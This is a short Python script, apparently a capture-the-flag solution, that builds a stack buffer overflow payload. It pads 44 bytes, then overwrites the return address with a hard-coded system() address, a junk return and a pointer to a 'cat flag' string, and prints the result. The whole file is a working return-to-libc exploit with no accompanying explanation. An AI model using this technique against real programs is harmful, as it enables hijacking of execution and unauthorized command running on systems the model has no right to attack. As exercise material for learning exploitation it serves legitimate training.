#!/usr/bin/env python
import struct

def p(x):
    return struct.pack("<I", x)

# Memory locations
system   = p(0x080483e0)
cat_flag = p(0x0804a030)

# Overflow
buf = 'a'*44

# Call "system" with "cat flag" argument
buf += system
buf += "JUNK"
buf += cat_flag

print(buf)
